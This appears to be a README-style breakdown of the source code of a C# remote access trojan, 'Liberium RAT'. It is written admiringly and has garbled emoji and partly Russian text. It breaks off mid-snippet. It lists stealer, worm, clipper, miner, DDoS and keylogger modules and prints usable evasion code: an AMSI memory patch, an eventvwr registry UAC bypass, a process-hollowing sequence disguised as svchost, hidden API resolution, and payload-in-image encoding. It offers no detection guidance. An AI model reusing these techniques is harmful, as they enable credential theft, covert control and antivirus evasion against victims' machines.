# ğŸ”¥ Liberium RAT 1.8.3 - Advanced Technical Analysis ğŸ”¥

## ğŸš€ Executive Summary

**Liberium RAT** is a sophisticated Remote Access Tool written in C# demonstrating advanced malware development techniques. This analysis reveals a highly complex multi-component system with innovative features and state-of-the-art evasion capabilities.

### ğŸ¯ Key Features
- **Modular Plugin Architecture** - 25+ specialized modules
- **HVNC Technology** - Hidden Virtual Network Computing
- **Advanced Data Stealing** - 50+ targeted applications
- **Network Propagation** - SMB/USB worm capabilities
- **Multi-layer Obfuscation** - String encryption, control flow, mutations
- **Evasion Techniques** - AMSI/ETW bypass, UAC bypass, Anti-VM

## ğŸ—ï¸ System Architecture & File Structure

### ğŸ“ Project Organization
```
Liberium 1.8.3 Source Code/
â”œâ”€â”€ ğŸ“‚ Client/                           # Victim-side malware
â”‚   â”œâ”€â”€ ğŸ“„ Program.cs                    # Main entry point
â”‚   â”œâ”€â”€ ğŸ“„ Config.cs                     # Configuration management
â”‚   â”œâ”€â”€ ğŸ“‚ Helper/                       # Core client utilities
â”‚   â”‚   â”œâ”€â”€ ğŸ“„ Client.cs                 # Network communication
â”‚   â”‚   â”œâ”€â”€ ğŸ“„ Install.cs                # Persistence mechanisms
â”‚   â”‚   â”œâ”€â”€ ğŸ“„ Methods.cs                # System utilities
â”‚   â”‚   â””â”€â”€ ğŸ“„ AsmiAndETW.cs            # AMSI/ETW bypass
â”‚   â””â”€â”€ ğŸ“‚ Leb128/                       # Data encoding library
â”‚       â””â”€â”€ ğŸ“„ LEB128.cs                 # Little Endian Base 128
â”‚
â”œâ”€â”€ ğŸ“‚ useless/Server/                   # Command & Control Panel
â”‚   â”œâ”€â”€ ğŸ“„ Form1.cs                      # Main GUI interface
â”‚   â”œâ”€â”€ ğŸ“„ Program.cs                    # Server entry point
â”‚   â”œâ”€â”€ ğŸ“‚ Connectings/                  # Network management
â”‚   â”‚   â”œâ”€â”€ ğŸ“„ Clients.cs                # Client connections
â”‚   â”‚   â”œâ”€â”€ ğŸ“„ Listner.cs                # Server listener
â”‚   â”‚   â””â”€â”€ ğŸ“„ Certificate.cs            # SSL/TLS certificates
â”‚   â”œâ”€â”€ ğŸ“‚ Forms/                        # GUI components (50+ forms)
â”‚   â”‚   â”œâ”€â”€ ğŸ“„ FormBulider.cs            # Malware builder
â”‚   â”‚   â”œâ”€â”€ ğŸ“„ FormHVNC.cs               # HVNC interface
â”‚   â”‚   â”œâ”€â”€ ğŸ“„ FormDesktop.cs            # Remote desktop
â”‚   â”‚   â””â”€â”€ ğŸ“„ FormExplorer.cs           # File manager
â”‚   â”œâ”€â”€ ğŸ“‚ Messages/                     # Protocol handlers
â”‚   â”‚   â”œâ”€â”€ ğŸ“„ HandlerConnect.cs         # Connection handling
â”‚   â”‚   â”œâ”€â”€ ğŸ“„ HandlerHVNC.cs            # HVNC commands
â”‚   â”‚   â””â”€â”€ ğŸ“„ HandlerRecovery.cs        # Data theft
â”‚   â”œâ”€â”€ ğŸ“‚ Helper/                       # Server utilities
â”‚   â”‚   â”œâ”€â”€ ğŸ“„ BitmapCoding.cs           # Steganography
â”‚   â”‚   â”œâ”€â”€ ğŸ“„ Methods.cs                # Utility functions
â”‚   â”‚   â””â”€â”€ ğŸ“‚ Bulider/                  # Build system
â”‚   â”œâ”€â”€ ğŸ“‚ Obfuscator/                   # Code protection
â”‚   â”‚   â”œâ”€â”€ ğŸ“‚ Obfuscator/               # Obfuscation engine
â”‚   â”‚   â””â”€â”€ ğŸ“‚ Helper/                   # Obfuscation utilities
â”‚   â””â”€â”€ ğŸ“‚ bin/Release/                  # Compiled components
â”‚       â”œâ”€â”€ ğŸ“‚ Plugin/                   # Plugin modules (25+)
â”‚       â”œâ”€â”€ ğŸ“‚ Icons/                    # Application icons (500+)
â”‚       â”œâ”€â”€ ğŸ“‚ Signatures/               # Digital signatures
â”‚       â””â”€â”€ ğŸ“‚ Scripts/                  # Utility scripts
â”‚
â””â”€â”€ ğŸ“‚ Plugin System/                    # Modular components
    â”œâ”€â”€ ğŸ“‚ HVNC/                         # Hidden Virtual Desktop
    â”œâ”€â”€ ğŸ“‚ Stealer/                      # Data theft engine
    â”œâ”€â”€ ğŸ“‚ Worm/                         # Network propagation
    â”œâ”€â”€ ğŸ“‚ Clipper/                      # Cryptocurrency hijacking
    â”œâ”€â”€ ğŸ“‚ KeyLogger/                    # Keystroke capture
    â”œâ”€â”€ ğŸ“‚ MinerXMR/                     # Monero mining
    â”œâ”€â”€ ğŸ“‚ MinerRigel/                   # Ethereum mining
    â”œâ”€â”€ ğŸ“‚ DDos/                         # DDoS attacks
    â”œâ”€â”€ ğŸ“‚ BotKiller/                    # Malware competition
    â”œâ”€â”€ ğŸ“‚ AntiProcess/                  # Analysis prevention
    â”œâ”€â”€ ğŸ“‚ AutoRun/                      # Persistence
    â”œâ”€â”€ ğŸ“‚ Fun/                          # System manipulation
    â””â”€â”€ ğŸ“‚ [20+ more plugins]/           # Additional modules


### ğŸ”„ Plugin Loading Mechanism

**Dynamic Plugin Architecture:**
1. **Plugin Discovery** - Server scans `/Plugin/` directory
2. **Runtime Loading** - Plugins loaded via reflection
3. **Interface Binding** - Common `IPlugin` interface
4. **Command Routing** - Messages routed to appropriate handlers
5. **Resource Management** - Automatic cleanup and disposal

**Plugin Interface Structure:**
```csharp
public interface IPlugin
{
    void Run(Socket TcpClient, X509Certificate2 certificate, string Hwid, byte[] Pack);
    void Stop();
    string GetPluginName();
    string GetVersion();
}
```

### ğŸ“Š File Relationship Matrix

| Component | Dependencies | Purpose | Key Files |
|-----------|-------------|---------|-----------|
| **Client Core** | Config.cs, LEB128.cs | Main malware logic | Program.cs, Client.cs |
| **Network Layer** | Certificate.cs, Clients.cs | Communication | Listner.cs, SSL handling |
| **Plugin System** | IPlugin interface | Modular functionality | 25+ plugin directories |
| **GUI Interface** | Forms/, Messages/ | User interaction | Form1.cs, 50+ forms |
| **Builder System** | Obfuscator/, Helper/ | Malware generation | FormBulider.cs |
| **Data Handlers** | HandlerXXX.cs files | Protocol processing | Messages/ directory |

### ğŸ”§ Critical File Dependencies

**Client.exe Dependencies:**
- `Config.cs` â†’ Configuration management
- `Install.cs` â†’ Persistence mechanisms
- `AsmiAndETW.cs` â†’ Security bypass
- `LEB128.cs` â†’ Data serialization
- `Methods.cs` â†’ System utilities

**Server.exe Dependencies:**
- `Form1.cs` â†’ Main GUI controller
- `Clients.cs` â†’ Connection management
- `Listner.cs` â†’ Network listener
- `Certificate.cs` â†’ SSL/TLS handling
- `Plugin/` â†’ Modular functionality

**Plugin System Dependencies:**
- `Plugin.cs` â†’ Plugin interface
- `LEB128.cs` â†’ Data encoding
- `Client.cs` â†’ Network communication
- Specific libraries per plugin functionality

### ğŸ“¡ Client-Server Communication
- **Protocol**: SSL/TLS encrypted TCP sockets
- **Encoding**: LEB128 (Little Endian Base 128) for data serialization
- **Buffer Size**: 512KB for optimal performance
- **Multi-server**: Failover support for C&C infrastructure

```csharp
// Core communication setup
this.socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
this.SslClient = new SslStream(new NetworkStream(this.socket, true));
this.SslClient.AuthenticateAsClient(ip, null, SslProtocols.Tls, false);
```

## ğŸ® HVNC - Hidden Virtual Network Computing

### Revolutionary Remote Desktop Technology
HVNC creates hidden virtual desktops allowing complete system control without user awareness.

```csharp
// Virtual desktop creation
HideDesktop hideDesktop = new HideDesktop();
hideDesktop.Create(desktopName);

// Screen capture with optimization
Client.Send(LEB128.Write(new object[3] {
    "HVNC", "Screen", 
    BitmapToByteArrayWithQuality(HelperScreen.GetScreen(width, height), encoderParams)
}));
```

**HVNC Capabilities:**
- Hidden desktop creation and management
- Real-time screen capture with FPS optimization
- Mouse and keyboard input handling
- Application launching in virtual environment
- File transfer through virtual desktop

## ğŸ”§ Plugin System Architecture (25+ Modules)

### ğŸ¯ Plugin Ecosystem Overview

```mermaid
graph TB
    subgraph "ğŸ® CORE PLUGINS"
        HVNC[ğŸ–¥ï¸ HVNC<br/>Hidden Desktop]
        Desktop[ğŸ–¼ï¸ Desktop<br/>Remote Control]
        Stealer[ğŸ’ RageStealer<br/>Data Theft]
        KeyLogger[âŒ¨ï¸ KeyLogger<br/>Keystroke Capture]
    end

    subgraph "ğŸ’° FINANCIAL PLUGINS"
        Clipper[ğŸ’° Clipper<br/>Crypto Hijack]
        MinerXMR[â›ï¸ MinerXMR<br/>Monero Mining]
        MinerRigel[â›ï¸ MinerRigel<br/>Ethereum Mining]
        MinerEtc[â›ï¸ MinerEtc<br/>ETC Mining]
    end

    subgraph "ğŸ¦  PROPAGATION PLUGINS"
        Worm[ğŸ¦  Worm<br/>Network Spread]
        AutoRun[ğŸ”„ AutoRun<br/>Persistence]
        BotKiller[ğŸ”ª BotKiller<br/>Competition]
        AntiProcess[ğŸš« AntiProcess<br/>Analysis Block]
    end

    subgraph "ğŸ”§ UTILITY PLUGINS"
        Explorer[ğŸ“ Explorer<br/>File Manager]
        Shell[ğŸ’» Shell<br/>Command Line]
        Process[âš™ï¸ Process<br/>Task Manager]
        Regedit[ğŸ“ Regedit<br/>Registry Editor]
    end

    subgraph "ğŸ­ CHAOS PLUGINS"
        Fun[ğŸ­ Fun<br/>System Chaos]
        DDos[ğŸ’¥ DDos<br/>Attack Module]
        Volume[ğŸ”Š Volume<br/>Audio Control]
        Window[ğŸªŸ Window<br/>UI Manipulation]
    end

    subgraph "ğŸ“¡ COMMUNICATION PLUGINS"
        Chat[ğŸ’¬ Chat<br/>Messaging]
        Camera[ğŸ“· Camera<br/>Surveillance]
        Microphone[ğŸ¤ Microphone<br/>Audio Capture]
        Map[ğŸ—ºï¸ Map<br/>Geolocation]
    end

    subgraph "ğŸ”’ SECURITY PLUGINS"
        UAC[ğŸ›¡ï¸ UAC<br/>Privilege Escalation]
        Service[âš™ï¸ Service<br/>System Services]
        HostsFile[ğŸ“„ HostsFile<br/>DNS Manipulation]
        Netstat[ğŸŒ Netstat<br/>Network Monitor]
    end

    %% Plugin Dependencies
    HVNC -.-> Desktop
    Stealer -.-> KeyLogger
    Clipper -.-> KeyLogger
    Worm -.-> AutoRun
    BotKiller -.-> AntiProcess
    Fun -.-> Volume
    Fun -.-> Window

    %% Styling
    classDef coreStyle fill:#ff6b6b,stroke:#d63031,stroke-width:3px,color:#fff
    classDef financialStyle fill:#00b894,stroke:#00a085,stroke-width:3px,color:#fff
    classDef propagationStyle fill:#e17055,stroke:#d63031,stroke-width:3px,color:#fff
    classDef utilityStyle fill:#74b9ff,stroke:#0984e3,stroke-width:3px,color:#fff
    classDef chaosStyle fill:#a29bfe,stroke:#6c5ce7,stroke-width:3px,color:#fff
    classDef commStyle fill:#fdcb6e,stroke:#e17055,stroke-width:3px,color:#2d3436
    classDef securityStyle fill:#fd79a8,stroke:#e84393,stroke-width:3px,color:#fff

    class HVNC,Desktop,Stealer,KeyLogger coreStyle
    class Clipper,MinerXMR,MinerRigel,MinerEtc financialStyle
    class Worm,AutoRun,BotKiller,AntiProcess propagationStyle
    class Explorer,Shell,Process,Regedit utilityStyle
    class Fun,DDos,Volume,Window chaosStyle
    class Chat,Camera,Microphone,Map commStyle
    class UAC,Service,HostsFile,Netstat securityStyle
```

### ğŸ“‹ Complete Plugin Directory Structure

```
ğŸ“‚ Plugin/
â”œâ”€â”€ ğŸ® Core Functionality
â”‚   â”œâ”€â”€ ğŸ“‚ HVNC/                    # Hidden Virtual Network Computing
â”‚   â”œâ”€â”€ ğŸ“‚ Desktop/                 # Remote desktop access
â”‚   â”œâ”€â”€ ğŸ“‚ Stealer/                 # RageStealer data theft engine
â”‚   â”œâ”€â”€ ğŸ“‚ Stealer1/                # Alternative stealer implementation
â”‚   â””â”€â”€ ğŸ“‚ KeyLogger/               # Keystroke capture and logging
â”‚
â”œâ”€â”€ ğŸ’° Financial Operations
â”‚   â”œâ”€â”€ ğŸ“‚ Clipper/                 # Cryptocurrency address replacement
â”‚   â”œâ”€â”€ ğŸ“‚ MinerXMR/                # Monero cryptocurrency mining
â”‚   â”œâ”€â”€ ğŸ“‚ MinerRigel/              # Ethereum mining with Rigel
â”‚   â””â”€â”€ ğŸ“‚ MinerEtc/                # Ethereum Classic mining
â”‚
â”œâ”€â”€ ğŸ¦  Propagation & Persistence
â”‚   â”œâ”€â”€ ğŸ“‚ Worm/                    # Network propagation module
â”‚   â”œâ”€â”€ ğŸ“‚ AutoRun/                 # Persistence mechanisms
â”‚   â”œâ”€â”€ ğŸ“‚ BotKiller/               # Competing malware elimination
â”‚   â””â”€â”€ ğŸ“‚ AntiProcess/             # Analysis tool prevention
â”‚
â”œâ”€â”€ ğŸ”§ System Utilities
â”‚   â”œâ”€â”€ ğŸ“‚ Explorer/                # Remote file management
â”‚   â”œâ”€â”€ ğŸ“‚ Shell/                   # Command line interface
â”‚   â”œâ”€â”€ ğŸ“‚ Process/                 # Process management
â”‚   â”œâ”€â”€ ğŸ“‚ Regedit/                 # Registry editor
â”‚   â”œâ”€â”€ ğŸ“‚ Service/                 # Windows services control
â”‚   â”œâ”€â”€ ğŸ“‚ Programs/                # Installed programs manager
â”‚   â”œâ”€â”€ ğŸ“‚ Performance/             # System performance monitor
â”‚   â””â”€â”€ ğŸ“‚ DeviceManager/           # Hardware device management
â”‚
â”œâ”€â”€ ğŸ­ Chaos & Disruption
â”‚   â”œâ”€â”€ ğŸ“‚ Fun/                     # System manipulation effects
â”‚   â”œâ”€â”€ ğŸ“‚ DDos/                    # Distributed denial of service
â”‚   â”œâ”€â”€ ğŸ“‚ Volume/                  # Audio volume control
â”‚   â”œâ”€â”€ ğŸ“‚ Window/                  # Window manipulation
â”‚   â””â”€â”€ ğŸ“‚ SystemSound/             # System sound control
â”‚
â”œâ”€â”€ ğŸ“¡ Communication & Surveillance
â”‚   â”œâ”€â”€ ğŸ“‚ Chat/                    # Real-time messaging
â”‚   â”œâ”€â”€ ğŸ“‚ Camera/                  # Webcam surveillance
â”‚   â”œâ”€â”€ ğŸ“‚ Microphone/              # Audio surveillance
â”‚   â”œâ”€â”€ ğŸ“‚ Map/                     # Geolocation tracking
â”‚   â”œâ”€â”€ ğŸ“‚ Clipboard/               # Clipboard monitoring
â”‚   â””â”€â”€ ğŸ“‚ BotSpeaker/              # Text-to-speech
â”‚
â”œâ”€â”€ ğŸ”’ Security & Evasion
â”‚   â”œâ”€â”€ ğŸ“‚ UAC/                     # UAC bypass techniques
â”‚   â”œâ”€â”€ ğŸ“‚ HostsFile/               # DNS manipulation
â”‚   â”œâ”€â”€ ğŸ“‚ Netstat/                 # Network connection monitor
â”‚   â””â”€â”€ ğŸ“‚ StealthSaver/            # Stealth operations
â”‚
â”œâ”€â”€ ğŸŒ Network Operations
â”‚   â”œâ”€â”€ ğŸ“‚ ReverseProxy/            # Reverse proxy functionality
â”‚   â”œâ”€â”€ ğŸ“‚ ReverseProxyR/           # Reverse proxy (reliable)
â”‚   â””â”€â”€ ğŸ“‚ SendFile/                # File transfer operations
â”‚
â””â”€â”€ ğŸ”§ Specialized Tools
    â”œâ”€â”€ ğŸ“‚ Injector/                # Code injection utilities
    â”œâ”€â”€ ğŸ“‚ FileSearcher/            # Advanced file search
    â”œâ”€â”€ ğŸ“‚ KeyLoggerPanel/          # Keylogger management panel
    â”œâ”€â”€ ğŸ“‚ KeyLoggerRemover/        # Keylogger cleanup
    â”œâ”€â”€ ğŸ“‚ Notepad/                 # Remote text editor
    â”œâ”€â”€ ğŸ“‚ ReportWindow/            # Window reporting
    â”œâ”€â”€ ğŸ“‚ SysPlug/                 # System plugin utilities
    â””â”€â”€ ğŸ“‚ Action/                  # Generic action handler
```

## ğŸ”§ Plugin System (25+ Modules)

### ğŸ¯ Core Plugins
1. **HVNC** - Hidden Virtual Network Computing
2. **RageStealer** - Comprehensive data theft
3. **Desktop** - Remote desktop access
4. **KeyLogger** - Keystroke capture
5. **Worm** - Network propagation
6. **Clipper** - Cryptocurrency address replacement
7. **AutoRun** - Persistence mechanisms
8. **BotKiller** - Competing malware elimination

### ğŸ’° RageStealer - Data Theft Engine

**Multi-threaded Architecture:**
```csharp
// Parallel data extraction
list.Add(new Thread(() => {
    // Browsers: Chrome, Firefox, Edge, Brave
    RageStealer.Target.Browsers.Chromium.Recovery.Run(savePath + "\\Browsers");
}));
list.Add(new Thread(() => {
    // Crypto wallets: 20+ wallets and extensions
    RageStealer.Target.Crypto.Crypto.GetWallets(savePath + "\\Wallets");
}));
```

**Targeted Applications:**
- **Browsers**: 15+ (passwords, cookies, history, autofill)
- **Messengers**: Discord, Telegram, Skype, ICQ
- **Gaming**: Steam, Minecraft, Roblox, Epic Games
- **Crypto**: 20+ wallets and browser extensions
- **VPN**: NordVPN, ExpressVPN configurations

### ğŸ¦  Worm - Network Propagation

**Infection Vectors:**
```csharp
// Multi-vector propagation
list.Add(new Thread(() => { SmbInfector.Run(); }));        // SMB networks
list.Add(new Thread(() => { MapNetworkDrive.Run(); }));    // Mapped drives
list.Add(new Thread(() => { FtpBrute.Run(); }));           // FTP bruteforce
```

## ğŸ”’ Advanced Obfuscation

### Multi-Layer Protection System

**1. String Encryption with Dynamic Keys:**
```csharp
// Unique encryption keys per build
encryptString.dec = Randomizer.Shuffle(charset);
encryptString.enc = Randomizer.Shuffle(encryptString.dec);
```

**2. Control Flow Obfuscation:**
- Method parameter renaming
- Block randomization
- False jump insertion
- Logic flow scrambling

**3. Memory Patching:**
```csharp
// AMSI/ETW bypass through memory patching
byte[] x64_amsi_patch = new byte[] { 0x48, 0x31, 0xC0, 0xC3 }; // xor rax, rax; ret
PatchMem(x64_amsi_patch, "amsi.dll", "AmsiScanBuffer");
```

## ğŸ›¡ï¸ Evasion Techniques

### ğŸ­ UAC Bypass Methods

**EventVwr Technique:**
```csharp
// Registry hijacking for privilege escalation
RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Classes\\", true);
key.CreateSubKey("mscfile\\Shell\\Open\\command");
key.SetValue("", "\"" + Process.GetCurrentProcess().MainModule.FileName + "\"");
WinExec("cmd.exe /k START " + eventvwr, 0);
```

### ğŸ” Anti-Analysis Features

**Virtual Machine Detection:**
- WMI queries for VM artifacts
- Disk size verification (minimum 45GB)
- Registry checks for VM software
- Process enumeration for analysis tools

**Sandbox Evasion:**
- DLL presence detection (Sandboxie, Avast, Comodo)
- Environment variable analysis
- Timing-based detection
- User interaction simulation

## ğŸ’€ Low-Level Techniques

### ğŸ§¬ Process Hollowing (RunPE) - Ğ”Ğ•Ğ¢ĞĞ›Ğ¬ĞĞ«Ğ™ ĞĞĞĞ›Ğ˜Ğ—

**Liberium RAT Ğ¸ÑĞ¿Ğ¾Ğ»ÑŒĞ·ÑƒĞµÑ‚ ĞšĞ›ĞĞ¡Ğ¡Ğ˜Ğ§Ğ•Ğ¡ĞšĞ˜Ğ™ Process Hollowing Ñ Ğ½ĞµÑĞºĞ¾Ğ»ÑŒĞºĞ¸Ğ¼Ğ¸ Ğ²Ğ°Ñ€Ğ¸Ğ°Ñ†Ğ¸ÑĞ¼Ğ¸:**

#### ğŸ¯ **Ğ¢ĞµÑ…Ğ½Ğ¸ĞºĞ° #1: Classic RunPE (ĞÑĞ½Ğ¾Ğ²Ğ½Ğ°Ñ)**
```csharp
// ĞšĞ»Ğ°ÑÑĞ¸Ñ‡ĞµÑĞºĞ°Ñ Ñ€ĞµĞ°Ğ»Ğ¸Ğ·Ğ°Ñ†Ğ¸Ñ process hollowing
CreateProcess(null, targetProcess, IntPtr.Zero, IntPtr.Zero, true, 4u, ...);
ZwUnmapViewOfSection(processHandle, imageBase);
VirtualAllocEx(processHandle, imageBase, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(processHandle, imageBase, payload, payload.Length, ref bytesWritten);
ResumeThread(threadHandle);
```

**ĞŸĞ¾ÑˆĞ°Ğ³Ğ¾Ğ²Ñ‹Ğ¹ Ğ¿Ñ€Ğ¾Ñ†ĞµÑÑ:**
1. **CreateProcess** - ÑĞ¾Ğ·Ğ´Ğ°ĞµÑ‚ Ğ¿Ñ€Ğ¾Ñ†ĞµÑÑ Ğ² suspended ÑĞ¾ÑÑ‚Ğ¾ÑĞ½Ğ¸Ğ¸
2. **ZwUnmapViewOfSection** - ÑƒĞ´Ğ°Ğ»ÑĞµÑ‚ Ğ¾Ñ€Ğ¸Ğ³Ğ¸Ğ½Ğ°Ğ»ÑŒĞ½Ñ‹Ğ¹ Ğ¾Ğ±Ñ€Ğ°Ğ· Ğ¸Ğ· Ğ¿Ğ°Ğ¼ÑÑ‚Ğ¸
3. **VirtualAllocEx** - Ğ²Ñ‹Ğ´ĞµĞ»ÑĞµÑ‚ Ğ½Ğ¾Ğ²ÑƒÑ Ğ¿Ğ°Ğ¼ÑÑ‚ÑŒ Ğ´Ğ»Ñ payload
4. **WriteProcessMemory** - Ğ·Ğ°Ğ¿Ğ¸ÑÑ‹Ğ²Ğ°ĞµÑ‚ malicious ĞºĞ¾Ğ´
5. **ResumeThread** - Ğ·Ğ°Ğ¿ÑƒÑĞºĞ°ĞµÑ‚ Ğ¿Ñ€Ğ¾Ñ†ĞµÑÑ Ñ Ğ½Ğ¾Ğ²Ñ‹Ğ¼ ĞºĞ¾Ğ´Ğ¾Ğ¼

#### ğŸ¯ **Ğ¢ĞµÑ…Ğ½Ğ¸ĞºĞ° #2: Stealth Mining Injection**
```csharp
// Ğ¡Ğ¿ĞµÑ†Ğ¸Ğ°Ğ»ÑŒĞ½Ğ¾ Ğ´Ğ»Ñ Ğ¼Ğ°Ğ¹Ğ½ĞµÑ€Ğ¾Ğ² (MinerRigel, MinerXMR)
public void Run(Socket TcpClient, X509Certificate2 x509Certificate2, string Hwid, byte[] Pack)
{
    MinerControler.Kill(); // Ğ£Ğ±Ğ¸Ğ²Ğ°ĞµÑ‚ ĞºĞ¾Ğ½ĞºÑƒÑ€Ğ¸Ñ€ÑƒÑÑ‰Ğ¸Ğµ Ğ¼Ğ°Ğ¹Ğ½ĞµÑ€Ñ‹

    // Process hollowing Ğ´Ğ»Ñ ÑĞºÑ€Ñ‹Ñ‚Ğ¾Ğ³Ğ¾ Ğ¼Ğ°Ğ¹Ğ½Ğ¸Ğ½Ğ³Ğ°
    string targetProcess = "svchost.exe"; // ĞœĞ°ÑĞºĞ¸Ñ€Ğ¾Ğ²ĞºĞ° Ğ¿Ğ¾Ğ´ ÑĞ¸ÑÑ‚ĞµĞ¼Ğ½Ñ‹Ğ¹ Ğ¿Ñ€Ğ¾Ñ†ĞµÑÑ
    InjectMiner(targetProcess, minerPayload);

    Methods.PreventSleep(); // ĞŸÑ€ĞµĞ´Ğ¾Ñ‚Ğ²Ñ€Ğ°Ñ‰Ğ°ĞµÑ‚ ÑĞ¾Ğ½ ÑĞ¸ÑÑ‚ĞµĞ¼Ñ‹
}
```

#### ğŸ¯ **Ğ¢ĞµÑ…Ğ½Ğ¸ĞºĞ° #3: Multi-Stage Injection**
```csharp
// ĞœĞ½Ğ¾Ğ³Ğ¾ÑÑ‚ÑƒĞ¿ĞµĞ½Ñ‡Ğ°Ñ‚Ğ°Ñ Ğ¸Ğ½ÑŠĞµĞºÑ†Ğ¸Ñ Ğ´Ğ»Ñ Ğ¾Ğ±Ñ…Ğ¾Ğ´Ğ° Ğ´ĞµÑ‚ĞµĞºÑ†Ğ¸Ğ¸
// 1. ĞŸĞµÑ€Ğ²Ñ‹Ğ¹ ÑÑ‚Ğ°Ğ¿ - Ğ¿Ñ€Ğ¾ÑÑ‚Ğ°Ñ DLL injection
SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, hMod, 0);

// 2. Ğ’Ñ‚Ğ¾Ñ€Ğ¾Ğ¹ ÑÑ‚Ğ°Ğ¿ - process hollowing Ğ¸Ğ· DLL
// 3. Ğ¢Ñ€ĞµÑ‚Ğ¸Ğ¹ ÑÑ‚Ğ°Ğ¿ - reflective DLL loading
```

### ğŸ”§ Dynamic API Resolution

```csharp
// Import hiding technique
public static T HiddenCallResolve<T>(string dllName, string methodName) where T : Delegate
{
    IntPtr moduleHandle = LoadLibrary(dllName);
    IntPtr functionPointer = GetProcAddress(moduleHandle, methodName);
    return (T)Marshal.GetDelegateForFunctionPointer(functionPointer, typeof(T));
}
```

## ğŸ”„ Data Flow & Component Interaction

### ğŸŒŠ System Data Flow Diagram

```mermaid
sequenceDiagram
    participant V as ğŸ¯ Victim Machine
    participant C as ğŸ“± Client.exe
    participant N as ğŸŒ Network Layer
    participant S as ğŸ–¥ï¸ Server
    participant P as ğŸ”§ Plugin System
    participant G as ğŸ® GUI Interface

    Note over V,G: Initial Infection & Connection
    V->>C: Execute malware
    C->>C: Load Config.cs
    C->>C: Apply AsmiAndETW bypass
    C->>C: Install persistence (Install.cs)
    C->>N: Establish SSL/TLS connection
    N->>S: Forward encrypted connection
    S->>G: Display new victim in GUI

    Note over V,G: Plugin Loading & Execution
    G->>S: User selects plugin
    S->>P: Load requested plugin
    P->>N: Send plugin commands
    N->>C: Forward commands to client
    C->>C: Execute plugin functionality
    C->>N: Send results back
    N->>S: Forward results
    S->>G: Display results in interface

    Note over V,G: Data Theft Example (RageStealer)
    G->>S: Request data theft
    S->>P: Load Stealer plugin
    P->>N: Send theft commands
    N->>C: Execute data collection
    C->>C: Scan browsers, wallets, games
    C->>N: Send stolen data (LEB128 encoded)
    N->>S: Receive encrypted data
    S->>G: Display stolen credentials

    Note over V,G: HVNC Session Example
    G->>S: Request HVNC session
    S->>P: Load HVNC plugin
    P->>N: Send HVNC commands
    N->>C: Create hidden desktop
    C->>C: Capture screen, handle input
    C->>N: Stream desktop data
    N->>S: Forward desktop stream
    S->>G: Display virtual desktop
```

### ğŸ”— Component Communication Matrix

| Source Component | Target Component | Communication Method | Data Format | Purpose |
|------------------|------------------|---------------------|-------------|---------|
| **Client.exe** | **Server** | SSL/TLS Socket | LEB128 Encoded | Command execution |
| **Server** | **Plugin System** | Reflection Loading | .NET Assembly | Dynamic functionality |
| **GUI Forms** | **Message Handlers** | Event-driven | Object arrays | User interactions |
| **Stealer Plugin** | **Target Applications** | File system access | Binary/Text | Data extraction |
| **HVNC Plugin** | **Windows API** | P/Invoke calls | Native structs | Desktop manipulation |
| **Builder** | **Obfuscator** | Direct method calls | ModuleDefMD | Code protection |
| **Network Layer** | **Certificate Store** | X509 API | Certificate objects | SSL/TLS security |


### ğŸ”§ Critical File Interactions

**Startup Sequence:**
1. `Program.cs` â†’ `Config.cs` (Load configuration)
2. `Config.cs` â†’ `AsmiAndETW.cs` (Apply security bypass)
3. `Program.cs` â†’ `Install.cs` (Setup persistence)
4. `Program.cs` â†’ `Client.cs` (Initialize network)
5. `Client.cs` â†’ `LEB128.cs` (Setup data encoding)

**Plugin Communication:**
1. `Form1.cs` â†’ `Clients.cs` (Select target)
2. `Clients.cs` â†’ `HandlerConnect.cs` (Route command)
3. `HandlerConnect.cs` â†’ `Plugin/XXX/Plugin.cs` (Load plugin)
4. `Plugin.cs` â†’ `LEB128.cs` (Encode data)
5. `Plugin.cs` â†’ Network â†’ Client execution

**Data Theft Flow:**
1. `FormExplorer.cs` â†’ `HandlerRecovery.cs`
2. `HandlerRecovery.cs` â†’ `Stealer/Plugin.cs`
3. `Stealer/Plugin.cs` â†’ `RageStealer/Rage.cs`
4. `Rage.cs` â†’ Browser/Crypto/Gaming modules
5. Results â†’ `DynamicFiles.cs` â†’ Server display

## ğŸ—ï¸ Builder System Architecture



**Build Settings Matrix:**
```
ğŸ“‹ Configuration Categories:
â”œâ”€â”€ ğŸŒ Network Settings
â”‚   â”œâ”€â”€ Server IP addresses (multiple failover)
â”‚   â”œâ”€â”€ Port configurations (multiple ports)
â”‚   â”œâ”€â”€ SSL certificate selection
â”‚   â””â”€â”€ Connection timeout settings
â”‚
â”œâ”€â”€ ğŸ”§ Installation Options
â”‚   â”œâ”€â”€ Persistence methods (Registry, Startup, Service)
â”‚   â”œâ”€â”€ Installation directory selection
â”‚   â”œâ”€â”€ Mutex name generation
â”‚   â””â”€â”€ Privilege escalation options
â”‚
â”œâ”€â”€ ğŸ­ Obfuscation Settings
â”‚   â”œâ”€â”€ String encryption strength
â”‚   â”œâ”€â”€ Control flow complexity
â”‚   â”œâ”€â”€ Symbol renaming patterns
â”‚   â””â”€â”€ Junk code density
â”‚
â”œâ”€â”€ ğŸ¨ Appearance Options
â”‚   â”œâ”€â”€ Icon selection (500+ available)
â”‚   â”œâ”€â”€ File description spoofing
â”‚   â”œâ”€â”€ Version information
â”‚   â””â”€â”€ Digital signature theft
â”‚
â””â”€â”€ ğŸ”’ Security Features
    â”œâ”€â”€ Anti-VM detection
    â”œâ”€â”€ Anti-debugging
    â”œâ”€â”€ Sandbox evasion
    â””â”€â”€ AMSI/ETW bypass
```

### ğŸ¨ Steganography - BitmapCoding

```csharp
// Encoding executables into images
public static Bitmap ByteToBitmap(byte[] buffer)
{
    // Encode 3 bytes per RGB pixel
    bitmap.SetPixel(i, j, Color.FromArgb(255, buffer[index], buffer[index + 1], buffer[index + 2]));
}
```

**Builder Features:**
- Automatic obfuscation application
- Digital signature theft (SigThief)
- Icon extraction and injection
- Configuration encryption
- Multi-format output support

## â›ï¸ Mining Capabilities - INJECTION TECHNIQUES ANALYSIS

### ğŸ”¥ Cryptocurrency Mining Modules Ñ RunPE

#### ğŸ¯ **MinerRigel** - Ethereum Mining (Classic RunPE)
```csharp
// Ğ˜ÑĞ¿Ğ¾Ğ»ÑŒĞ·ÑƒĞµÑ‚ ĞšĞ›ĞĞ¡Ğ¡Ğ˜Ğ§Ğ•Ğ¡ĞšĞ˜Ğ™ Process Hollowing
public void Run(Socket TcpClient, X509Certificate2 x509Certificate2, string Hwid, byte[] Pack)
